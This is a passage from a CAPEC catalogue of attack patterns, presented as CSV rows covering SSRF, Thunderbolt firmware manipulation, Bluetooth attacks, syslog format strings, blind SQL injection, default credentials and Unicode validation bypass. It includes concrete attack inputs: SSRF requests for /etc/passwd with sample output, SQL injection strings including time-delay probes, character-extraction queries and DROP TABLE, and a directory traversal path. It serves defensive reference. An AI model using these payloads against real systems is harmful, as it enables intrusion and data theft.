vulnerableService=http://vulnerableshop.net:8080/product/category/check%3FcategoryName%3DsomeCategory A malicious user can modify the request URL to look like this instead: POST /product/category HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 200 vulnerableService=http://localhost/server-status or vulnerableService = file:///etc/passwd or vulnerableService=dict://localhost:12345/info If the exploit is successful, the server may return the data requested by the adversary root:!:0:0::/:/usr/bin/ksh daemon:!:1:1::/etc: bin:!:2:2::/bin: sys:!:3:3::/usr/sys: adm:!:4:4::/var/adm: uucp:!:5:5::/usr/lib/uucp: guest:!:100:100::/home/guest: nobody:!:4294967294:4294967294::/: lpd:!:9:4294967294::/: lp:*:11:11::/var/spool/lp:/bin/false invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico paul:!:201:1::/home/paul:/usr/bin/ksh jdoe:*:202:1:My name:/home/myname:/usr/bin/ksh::The CallStranger attack is an observed example of SSRF. It specifically targets the UPnP (Universal Plug and Play) protocol used by various network devices and gaming consoles. To execute the attack, an adversary performs a scan of the LAN to discover UPnP enabled devices, and subsequently a list of UPnP services they use. Once the UPnP service endpoints are listed, a vulnerability in the UPnP protocol is used to send these endpoints as encrypted to a verification server via the UPnP Callback method. Because the encryption is done on the client side, the server returns an encrypted list of services which is decrypted on the client side. The adversary then has a list of services running the vulnerable UPnP protocol, which the adversary can leverage to make spoofed requests. [REF-646]::",::918::20::,N/A,N/A,https://capec.mitre.org/data/definitions/664.html
CAPEC-665,Exploitation of Thunderbolt Protection Flaws,Detailed,Stable,"An adversary leverages a firmware weakness within the Thunderbolt protocol, on a computing device to manipulate Thunderbolt controller firmware in order to exploit vulnerabilities in the implementation of authorization and verification schemes within Thunderbolt protection mechanisms. Upon gaining physical access to a target device, the adversary conducts high-level firmware manipulation of the victim Thunderbolt controller SPI (Serial Peripheral Interface) flash, through the use of a SPI Programing device and an external Thunderbolt device, typically as the target device is booting up. If successful, this allows the adversary to modify memory, subvert authentication mechanisms, spoof identities and content, and extract data and memory from the target device. Currently 7 major vulnerabilities exist within Thunderbolt protocol with 9 attack vectors as noted in the Execution Flow.",N/A,Low,Very High,::NATURE:ChildOf:CAPEC ID:276::NATURE:CanFollow:CAPEC ID:390::NATURE:PeerOf:CAPEC ID:458::NATURE:PeerOf:CAPEC ID:148::NATURE:PeerOf:CAPEC ID:151::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey physical victim environment and potential Thunderbolt system targets] The adversary monitors the target's physical environment to identify systems with Thunderbolt interfaces, identify potential weaknesses in physical security in addition to periods of nonattendance by the victim over their Thunderbolt interface equipped devices, and when the devices are in locked or sleep state.::STEP:2:PHASE:Explore:DESCRIPTION:[Evaluate the target system and its Thunderbolt interface] The adversary determines the device's operating system, Thunderbolt interface version, and any implemented Thunderbolt protections to plan the attack.::STEP:1:PHASE:Experiment:DESCRIPTION:[Obtain and/or clone firmware image] The adversary physically manipulates Thunderbolt enabled devices to acquire the firmware image from the target and/or adversary Thunderbolt host controller's SPI (Serial Peripheral Interface) flash.TECHNIQUE:Disassemble victim and/or adversary device enclosure with basic tools to gain access to Thunderbolt controller SPI flash by connecting adversary SPI programmer.:TECHNIQUE:Adversary connects SPI programmer to adversary-controlled Thunderbolt enabled device to obtain/clone victim thunderbolt controller firmware image through tools/scripts.:TECHNIQUE:Clone firmware image with SPI programmer and tools/scripts on adversary-controlled device.::STEP:2:PHASE:Experiment:DESCRIPTION:[Parse and locate relevant firmware data structures and information based upon Thunderbolt controller model, firmware version, and other information] The acquired victim and/or adversary firmware image is parsed for specific data and other relevant identifiers required for exploitation, based upon the victim device information and firmware version.TECHNIQUE:Utilize pre-crafted tools/scripts to parse and locate desired firmware data and modify it.:TECHNIQUE:Locate DROM (Device Read Only Memory) data structure section and calculate/determine appropriate offset to replicate victim device UUID.:TECHNIQUE:Locate ACL (Access Control List) data structure and calculate/determine appropriate offsets to identify victim device UUID.:TECHNIQUE:Locate data structure containing challenge-response key information between appropriate offsets.::STEP:3:PHASE:Experiment:DESCRIPTION:[Disable Thunderbolt security and prevent future Thunderbolt security modifications (if necessary)] The adversary overrides the target device's Thunderbolt Security Level to None (SL0) and/or enables block protections upon the SPI flash to prevent the ability for the victim to perform and/or recognize future Thunderbolt security modifications as well as update the Thunderbolt firmware.TECHNIQUE:The adversary-controlled Thunderbolt device, connected to SPI programmer and victim device via Thunderbolt ports, is utilized to execute commands within tools/scripts to disable SPI flash protections, modify Thunderbolt Security Level, and enable malicious SPI flash protections.::STEP:4:PHASE:Experiment:DESCRIPTION:[Modify/replace victim Thunderbolt firmware image] The modified victim and/or adversary thunderbolt firmware image is written to attacker SPI flash.::STEP:1:PHASE:Exploit:DESCRIPTION:[Connect adversary-controlled thunderbolt enabled device to victim device and verify successful execution of malicious actions] The adversary needs to determine if their exploitation of selected vulnerabilities had the intended effects upon victim device.TECHNIQUE:Observe victim device identify adversary device as the victim device and enables PCIe tunneling.:TECHNIQUE:Resume victim device from sleep, connect adversary-controlled device and observe security is disabled and Thunderbolt connectivity is restored with PCIe tunneling being enabled.:TECHNIQUE:Observe that in UEFI or Thunderbolt Management Tool/UI that the Security Level does not match adversary modified Security Level of None (SL0):TECHNIQUE:Observe after installation of Firmware update that within Thunderbolt Management UI the NVM version is unchanged/same prior to the prompt of successful Firmware update/installation.::STEP:2:PHASE:Exploit:DESCRIPTION:[Exfiltration of desired data from victim device to adversary device] Utilize PCIe tunneling to transfer desired data and information from victim device across Thunderbolt connection.::","::The adversary needs at least a few minutes of physical access to a system with an open Thunderbolt port, version 3 or lower, and an external thunderbolt device controlled by the adversary with maliciously crafted software and firmware, via an SPI Programming device, to exploit weaknesses in security protections.::","::SKILL:Detailed knowledge on various system motherboards, PCI Express Domain, SPI, and Thunderbolt Protocol in order to interface with internal system components via external devices.:LEVEL:High::SKILL:Detailed knowledge on OS/Kernel memory address space, Direct Memory Access (DMA) mapping, Input-Output Memory Management Units (IOMMUs), and vendor memory protections for data leakage.:LEVEL:High::SKILL:Detailed knowledge on scripting and SPI programming in order to configure and modify Thunderbolt controller firmware and software configurations.:LEVEL:High::","::SPI Programming device capable of modifying/configuring or replacing the firmware of Thunderbolt device stored on SPI Flash of target Thunderbolt controller, as well as modification/spoofing of adversary-controlled Thunderbolt controller.::Precrafted scripts/tools capable of implementing the modification and replacement of Thunderbolt Firmware.::Thunderbolt-enabled computing device capable of interfacing with target Thunderbolt device and extracting/dumping data and memory contents of target device.::",::Windows Event logs may document the access of Thunderbolt port as a USB 3.0 event as well as any malicious actions taken upon target device as file system and memory events.::,::SCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands::,::Implementation: Kernel Direct Memory Access Protection::Configuration: Enable UEFI option USB Passthrough mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface::Configuration: Enable UEFI option DisplayPort mode - Thunderbolt 3 system port operates as video-only DP interface::Configuration: Enable UEFI option Mixed USB/DisplayPort mode - Thunderbolt 3 system port operates as USB 3.1 Type C interface with support for DP mode::Configuration: Set Security Level to SL3 for Thunderbolt 2 system port::Configuration: Disable PCIe tunneling to set Security Level to SL3::Configuration: Disable Boot Camp upon MacOS systems::,"::An adversary steals a password protected laptop that contains a Thunderbolt 3 enabled port, from a work environment. The adversary uses a screw driver to remove the back panel of the laptop and connects a SPI Programming device to the Thunderbolt Host Controller SPI Flash of the stolen victim device to interface with it on the adversary's own Thunderbolt enabled device via Thunderbolt cables. The SPI Programming device is utilized to execute scripts/tools from the adversary's own system to copy, parse, and modify the victim's Thunderbolt firmware stored on SPI Flash. The device UUID value is obtained, by computing the appropriate offset based upon Thunderbolt firmware version and the OS of victim device, from the DROM section of victim Thunderbolt host controller firmware image. The firmware image is written to adversary Thunderbolt host controller SPI flash to clone and spoof victim device identity. The adversary reboots the victim device, with the victim device identifying the Thunderbolt connection of the adversary's Thunderbolt device as itself and enables PCIe tunneling. The adversary finally transfers the hard drive and memory contents of victim device across Thunderbolt connection.::",::345::353::288::1188::862::,TAXONOMY NAME:ATTACK:ENTRY ID:1495:ENTRY NAME:Firmware Corruption::::TAXONOMY NAME:ATTACK:ENTRY ID:1211:ENTRY NAME:Exploitation for Defensive Evasion::::TAXONOMY NAME:ATTACK:ENTRY ID:1556:ENTRY NAME:Modify Authentication Process::,N/A,https://capec.mitre.org/data/definitions/665.html
CAPEC-666,BlueSmacking,Standard,Draft,An adversary uses Bluetooth flooding to transfer large packets to Bluetooth enabled devices over the L2CAP protocol with the goal of creating a DoS. This attack must be carried out within close proximity to a Bluetooth enabled device.,N/A,Medium,Medium,::NATURE:ChildOf:CAPEC ID:125::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Scan for Bluetooth Enabled Devices] Using BlueZ along with an antenna, an adversary searches for devices with Bluetooth on.TECHNIQUE:Note the MAC address of the device you want to attack.::STEP:2:PHASE:Experiment:DESCRIPTION:[Change L2CAP Packet Length] The adversary must change the L2CAP packet length to create packets that will overwhelm a Bluetooth enabled device.TECHNIQUE:An adversary downloads and installs BlueZ, the standard Bluetooth utility package for Linux.::STEP:3:PHASE:Exploit:DESCRIPTION:[Flood] An adversary sends the packets to the target device, and floods it until performance is degraded.::",::The system/application has Bluetooth enabled.::,"::SKILL:An adversary only needs a Linux machine along with a Bluetooth adapter, which is extremely common.:LEVEL:Low::",N/A,::Performance is degraded or halted by incoming L2CAP packets.::,::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution:TECHNICAL IMPACT:Resource Consumption::,"::Disable Bluetooth when not being used.::When using Bluetooth, set it to hidden or non-discoverable mode.::",N/A,::404::,N/A,N/A,https://capec.mitre.org/data/definitions/666.html
CAPEC-667,Bluetooth Impersonation AttackS (BIAS),Detailed,Draft,An adversary disguises the MAC address of their Bluetooth enabled device to one for which there exists an active and trusted connection and authenticates successfully. The adversary can then perform malicious actions on the target Bluetooth device depending on the target’s capabilities.,N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:616::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find disguise and target] The adversary starts the Bluetooth service on the attacking device and searches for nearby listening devices.TECHNIQUE:Knowledge of a trusted MAC address.:TECHNIQUE:Scanning for devices other than the target that may be trusted.::STEP:2:PHASE:Experiment:DESCRIPTION:[Disguise] Using the MAC address of the device the adversary wants to impersonate, they may use a tool such as spooftooth or macchanger to spoof their Bluetooth address and attempt to authenticate with the target.::STEP:3:PHASE:Exploit:DESCRIPTION:[Use device capabilities to accomplish goal] Finally, if authenticated successfully the adversary can perform tasks/information gathering dependent on the target's capabilities and connections.::",::Knowledge of a target device's list of trusted connections.::,::SKILL:Adversaries must be capable of using command line Linux tools.:LEVEL:Low::SKILL:Adversaries must be in close proximity to Bluetooth devices.:LEVEL:Low::,N/A,N/A,"::SCOPE:Integrity:NOTE:Integrity An adversary will be impersonating another Bluetooth device, and may gain access to information pertaining to that user along with the ability to manipulate other information.::SCOPE:Confidentiality:NOTE:Confidentiality An adversary will have unauthorized access to information.::",::Disable Bluetooth in public places.::Verify incoming Bluetooth connections; do not automatically trust.::Change default PIN passwords and always use one when connecting.::,N/A,::290::,N/A,N/A,https://capec.mitre.org/data/definitions/667.html
CAPEC-668,Key Negotiation of Bluetooth Attack (KNOB),Standard,Draft,"An adversary can exploit a flaw in Bluetooth key negotiation allowing them to decrypt information sent between two devices communicating via Bluetooth. The adversary uses an Adversary in the Middle setup to modify packets sent between the two devices during the authentication process, specifically the entropy bits. Knowledge of the number of entropy bits will allow the attacker to easily decrypt information passing over the line of communication.",N/A,Low,High,::NATURE:ChildOf:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:148::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Discovery] Using an established Person in the Middle setup, search for Bluetooth devices beginning the authentication process.TECHNIQUE:Use packet capture tools.::STEP:2:PHASE:Experiment:DESCRIPTION:[Change the entropy bits] Upon recieving the initial key negotiation packet from the master, the adversary modifies the entropy bits requested to 1 to allow for easy decryption before it is forwarded.::STEP:3:PHASE:Exploit:DESCRIPTION:[Capture and decrypt data] Once the entropy of encryption is known, the adversary can capture data and then decrypt on their device.::",::Person in the Middle network setup.::,::SKILL:Ability to modify packets.:LEVEL:Medium::,"::Bluetooth adapter, packet capturing capabilities.::",N/A,::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,::Newer Bluetooth firmwares ensure that the KNOB is not negotaited in plaintext. Update your device.::,"::Given users Alice, Bob and Charlie (Charlie being the attacker), Alice and Bob begin to agree on an encryption key when connecting. While Alice sends a message to Bob that an encryption key with 16 bytes of entropy should be used, Charlie changes this to 1 and forwards the request to Bob and continues forwarding these packets until authentication is successful.::",::425::285::693::,N/A,N/A,https://capec.mitre.org/data/definitions/668.html
CAPEC-67,String Format Overflow in syslog(),Detailed,Draft,"This attack targets applications and software that uses the syslog() function insecurely. If an application does not explicitely use a format string parameter in a call to syslog(), user input can be placed in the format string parameter leading to a format string injection attack. Adversaries can then inject malicious format string commands into the function call leading to a buffer overflow. There are many reported software vulnerabilities with the root cause being a misuse of the syslog() function.",N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:100::NATURE:ChildOf:CAPEC ID:135::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack, adversaries look for applications that use syslog() incorrectly.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer. For each user-controllable input that the adversary suspects is vulnerable to format string injection, attempt to inject formatting characters such as %n, %s, etc.. The goal is to manipulate the string creation using these formatting characters.TECHNIQUE:Inject probe payload which contains formatting characters (%s, %d, %n, etc.) through input parameters.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary will craft a set of content that not only overflows the targeted buffer but does so in such a way that the overwritten return address is replaced with one of the adversaries' choosing which points to code injected by the adversary.TECHNIQUE:The formatting characters %s and %d are useful for observing memory and trying to print memory addresses. If an adversary has access to the log being written to they can observer this output and use it to help craft their attack.:TECHNIQUE:The formatting character %n is useful for adding extra data onto the buffer.::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary supplies the program with the crafted format string injection, causing a buffer.::","::The Syslog function is used without specifying a format string argument, allowing user input to be placed direct into the function call as a format string.::",N/A,N/A,N/A,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::,"::The code should be reviewed for misuse of the Syslog function call. Manual or automated code review can be used. The reviewer needs to ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, do not use the %n operator in format strings. The following code shows a correct usage of Syslog(): syslog(LOG_ERR, %s, cmdBuf); The following code shows a vulnerable usage of Syslog(): syslog(LOG_ERR, cmdBuf); // the buffer cmdBuff is taking user supplied data.::","::Format string vulnerability in TraceEvent function for ntop before 2.1 allows remote adversaries to execute arbitrary code by causing format strings to be injected into calls to the syslog function, via (1) an HTTP GET request, (2) a user name in HTTP authentication, or (3) a password in HTTP authentication. See also: CVE-2002-0412::",::120::134::74::20::680::697::,TAXONOMY NAME:WASC:ENTRY ID:06:ENTRY NAME:Format String::,N/A,https://capec.mitre.org/data/definitions/67.html
CAPEC-69,Target Programs with Elevated Privileges,Standard,Draft,This attack targets programs running with elevated privileges. The adversary tries to leverage a vulnerability in the running program and get arbitrary code to execute with elevated privileges.,N/A,High,Very High,::NATURE:ChildOf:CAPEC ID:233::NATURE:CanPrecede:CAPEC ID:8::NATURE:CanPrecede:CAPEC ID:9::NATURE:CanPrecede:CAPEC ID:10::NATURE:CanPrecede:CAPEC ID:67::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Find programs with elevated priveleges] The adversary probes for programs running with elevated privileges.TECHNIQUE:Look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break.::STEP:2:PHASE:Explore:DESCRIPTION:[Find vulnerability in running program] The adversary looks for a vulnerability in the running program that would allow for arbitrary code execution with the privilege of the running program.TECHNIQUE:Look for improper input validation:TECHNIQUE:Look for improper failure safety. For instance when a program fails it may authorize restricted access to anyone.:TECHNIQUE:Look for a buffer overflow which may be exploited if an adversary can inject unvalidated data.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute arbitrary code] The adversary exploits the vulnerability that they have found. For instance, they can try to inject and execute arbitrary code or write to OS resources.::","::The targeted program runs with elevated OS privileges.::The targeted program accepts input data from the user or from another program.::The targeted program is giving away information about itself. Before performing such attack, an eventual attacker may need to gather information about the services running on the host target. The more the host target is verbose about the services that are running (version number of application, etc.) the more information can be gather by an attacker.::This attack often requires communicating with the host target services directly. For instance Telnet may be enough to communicate with the host target.::","::SKILL:An attacker can use a tool to scan and automatically launch an attack against known issues. A tool can also repeat a sequence of instructions and try to brute force the service on the host target, an example of that would be the flooding technique.:LEVEL:Low::SKILL:More advanced attack may require knowledge of the protocol spoken by the host service.:LEVEL:Medium::",N/A,::The log can have a trace of abnormal activity. Also if abnormal activity is detected on the host target. For instance flooding should be seen as abnormal activity and the target host may decide to take appropriate action in order to mitigate the attack (data filtering or blocking). Resource exhaustion is also a sign of abnormal activity.::,::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::,"::Apply the principle of least privilege.::Validate all untrusted data.::Apply the latest patches.::Scan your services and disable the ones which are not needed and are exposed unnecessarily. Exposing programs increases the attack surface. Only expose the services which are needed and have security mechanisms such as authentication built around them.::Avoid revealing information about your system (e.g., version of the program) to anonymous users.::Make sure that your program or service fail safely. What happen if the communication protocol is interrupted suddenly? What happen if a parameter is missing? Does your system have resistance and resilience to attack? Fail safely when a resource exhaustion occurs.::If possible use a sandbox model which limits the actions that programs can take. A sandbox restricts a program to a set of privileges and commands that make it difficult or impossible for the program to cause any damage.::Check your program for buffer overflow and format String vulnerabilities which can lead to execution of malicious code.::Monitor traffic and resource usage and pay attention if resource exhaustion occurs.::Protect your log file from unauthorized modification and log forging.::",N/A,::250::15::,N/A,N/A,https://capec.mitre.org/data/definitions/69.html
CAPEC-7,Blind SQL Injection,Detailed,Draft,"Blind SQL Injection results from an insufficient mitigation for SQL Injection. Although suppressing database error messages are considered best practice, the suppression alone is not sufficient to prevent SQL Injection. Blind SQL Injection is a form of SQL Injection that overcomes the lack of error messages. Without the error messages that facilitate SQL Injection, the adversary constructs input strings that probe the target through simple Boolean SQL expressions. The adversary can determine if the syntax and structure of the injection was successful based on whether the query was executed or not. Applied iteratively, the adversary determines how and where the target is vulnerable to SQL Injection.",N/A,High,High,::NATURE:ChildOf:CAPEC ID:66::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Hypothesize SQL queries in application]Generated hypotheses regarding the SQL queries in an application. For example, the adversary may hypothesize that their input is passed directly into a query that looks like: SELECT * FROM orders WHERE ordernum = _____orSELECT * FROM orders WHERE ordernum IN (_____)orSELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____ Of course, there are many other possibilities.TECHNIQUE:Research types of SQL queries and determine which ones could be used at various places in an application.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine how to inject information into the queries]Determine how to inject information into the queries from the previous step such that the injection does not impact their logic. For example, the following are possible injections for those queries: 5' OR 1=1; --and5) OR 1=1; --andordernum DESC; --TECHNIQUE:Add clauses to the SQL queries such that the query logic does not change.:TECHNIQUE:Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not.::STEP:3:PHASE:Experiment:DESCRIPTION:[Determine user-controllable input susceptible to injection] Determine the user-controllable input susceptible to injection. For each user-controllable input that the adversary suspects is vulnerable to SQL injection, attempt to inject the values determined in the previous step. If an error does not occur, then the adversary knows that the SQL injection was successful.TECHNIQUE:Use web browser to inject input through text fields or through HTTP GET parameters.:TECHNIQUE:Use a web application debugging tool such as Tamper Data, TamperIE, WebScarab,etc. to modify HTTP POST parameters, hidden fields, non-freeform fields, etc.:TECHNIQUE:Use network-level packet injection tools such as netcat to inject input:TECHNIQUE:Use modified client (modified by reverse engineering) to inject input.::STEP:4:PHASE:Experiment:DESCRIPTION:[Determine database type] Determines the type of the database, such as MS SQL Server or Oracle or MySQL, using logical conditions as part of the injected queriesTECHNIQUE:Try injecting a string containing char(0x31)=char(0x31) (this evaluates to 1=1 in SQL Server only):TECHNIQUE:Try injecting a string containing 0x313D31 (this evaluates to 1=1 in MySQL only):TECHNIQUE:Inject other database-specific commands into input fields susceptible to SQL Injection. The adversary can determine the type of database that is running by checking whether the query executed successfully or not (i.e. whether the adversary received a normal response from the server or not).::STEP:5:PHASE:Exploit:DESCRIPTION:[Extract information about database schema] Extract information about database schema by getting the database to answer yes/no questions about the schema.TECHNIQUE:Automatically extract database schema using a tool such as Absinthe.:TECHNIQUE:Manually perform the blind SQL Injection to extract desired information about the database schema.::STEP:6:PHASE:Exploit:DESCRIPTION:[Exploit SQL Injection vulnerability] Use the information obtained in the previous steps to successfully inject the database in order to bypass checks or modify, add, retrieve or delete data from the databaseTECHNIQUE:Use information about how to inject commands into SQL queries as well as information about the database schema to execute attacks such as dropping tables, inserting records, etc.::","::SQL queries used by the application to store, retrieve or modify data.::User-controllable input that is not properly validated by the application as part of SQL queries.::","::SKILL:Determining the database type and version, as well as the right number and type of parameters to the query being injected in the absence of error messages requires greater skill than reverse-engineering database error messages.:LEVEL:Medium::",::None: No specialized resources are required to execute this type of attack.::,"::The only indicators of successful Blind SQL Injection are the application or database logs that show similar queries with slightly differing logical conditions that increase in complexity over time. However, this requires extensive logging as well as knowledge of the queries that can be used to perform such injection and return meaningful information from the database.::",::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::,"::Security by Obscurity is not a solution to preventing SQL Injection. Rather than suppress error messages and exceptions, the application must handle them gracefully, returning either a custom error page or redirecting the user to a default page, without revealing any information about the database or the application internals.::Strong input validation - All user-controllable input must be validated and filtered for illegal characters as well as SQL content. Keywords such as UNION, SELECT or INSERT must be filtered in addition to characters such as a single-quote(') or SQL-comments (--) based on the context in which they appear.::","::An adversary may try entering something like username' AND 1=1; -- in an input field. If the result is the same as when the adversary entered username in the field, then the adversary knows that the application is vulnerable to SQL Injection. The adversary can then ask yes/no questions from the database server to extract information from it. For example, the adversary can extract table names from a database using the following types of queries: username' AND ascii(lower(substring((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'), 1, 1))) > 108. If the above query executes properly, then the adversary knows that the first character in a table name in the database is a letter between m and z. If it doesn't, then the adversary knows that the character must be between a and l (assuming of course that table names only contain alphabetic characters). By performing a binary search on all character positions, the adversary can determine all table names in the database. Subsequently, the adversary may execute an actual attack and send something like: username'; DROP TABLE trades; --::In the PHP application TimeSheet 1.1, an adversary can successfully retrieve username and password hashes from the database using Blind SQL Injection. If the adversary is aware of the local path structure, the adversary can also remotely execute arbitrary code and write the output of the injected queries to the local path. Blind SQL Injection is possible since the application does not properly sanitize the $_POST['username'] variable in the login.php file. See also: CVE-2006-4705::",::89::209::74::20::697::707::,TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Blind SQL Injection::,N/A,https://capec.mitre.org/data/definitions/7.html
CAPEC-70,Try Common or Default Usernames and Passwords,Detailed,Draft,"An adversary may try certain common or default usernames and passwords to gain access into the system and perform unauthorized actions. An adversary may try an intelligent brute force using empty passwords, known vendor default credentials, as well as a dictionary of common usernames and passwords. Many vendor products come preconfigured with default (and thus well-known) usernames and passwords that should be deleted prior to usage in a production environment. It is a common mistake to forget to remove these default login credentials. Another problem is that users would pick very simple (common) passwords (e.g. secret or password) that make it easier for the attacker to gain access to the system compared to using a brute force attack or even a dictionary attack using a full dictionary.",N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::,N/A,::The system uses one factor password based authentication.The adversary has the means to interact with the system.::,"::SKILL:An adversary just needs to gain access to common default usernames/passwords specific to the technologies used by the system. Additionally, a brute force attack leveraging common passwords can be easily realized if the user name is known.:LEVEL:Low::",::Technology or vendor specific list of default usernames and passwords.::,::Many incorrect login attempts are detected by the system.::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::,"::Delete all default account credentials that may be put in by the product vendor.::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.::","::A user sets their password to 123 or intentionally leaves their password blank. If the system does not have password strength enforcement against a sound password policy, this password may be admitted. Passwords like these two examples are two simple and common passwords that are easily able to be guessed by the adversary.::Cisco 2700 Series Wireless Location Appliances (version 2.1.34.0 and earlier) have a default administrator username root with a password password. This allows remote attackers to easily obtain administrative privileges. See also: CVE-2006-5288::In April 2019, adversaries attacked several popular IoT devices (a VOIP phone, an office printer, and a video decoder) across multiple customer locations. An investigation conducted by the Microsoft Security Resposne Center (MSRC) discovered that these devices were used to gain initial access to corporate networks. In two of the cases, the passwords for the devices were deployed without changing the default manufacturer’s passwords and in the third instance the latest security update had not been applied to the device. [REF-572]::",::521::262::263::798::654::308::309::,TAXONOMY NAME:ATTACK:ENTRY ID:1078.001:ENTRY NAME:Valid Accounts:Default Accounts::,N/A,https://capec.mitre.org/data/definitions/70.html
CAPEC-71,Using Unicode Encoding to Bypass Validation Logic,Detailed,Draft,An attacker may provide a Unicode string to a system component that is not Unicode aware and use that to circumvent the filter or cause the classifying mechanism to fail to properly understanding the request. That may allow the attacker to slip malicious data past the content filter and/or possibly cause the application to route the request incorrectly.,N/A,Medium,High,::NATURE:ChildOf:CAPEC ID:267::,"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all user input entry points visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the Explore phase as a target list and injects various Unicode encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.TECHNIQUE:Try to use Unicode encoding of content in Scripts in order to bypass validation routines.:TECHNIQUE:Try to use Unicode encoding of content in HTML in order to bypass validation routines.:TECHNIQUE:Try to use Unicode encoding of content in CSS in order to bypass validation routines.::",::Filtering is performed on data that has not be properly canonicalized.::,::SKILL:An attacker needs to understand Unicode encodings and have an idea (or be able to find out) what system components may not be Unicode aware.:LEVEL:Medium::,N/A,::Unicode encoded data is passed to APIs where it is not expected::,::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:AvailabilityTECHNICAL IMPACT:Unreliable Execution::,::Ensure that the system is Unicode aware and can properly process Unicode data. Do not make an assumption that data will be in ASCII.::Ensure that filtering or input validation is applied to canonical data.::Assume all input is malicious. Create an allowlist that defines all valid input to the software system based on the requirements specifications. Input that does not match against the allowlist should not be permitted to enter into the system.::,"::Attack Example: Unicode Encodings in the IIS Server A very common technique for a Unicode attack involves traversing directories looking for interesting files. An example of this idea applied to the Web is http://target.server/some_directory/../../../winnt In this case, the attacker is attempting to traverse to a directory that is not supposed to be part of standard Web services. The trick is 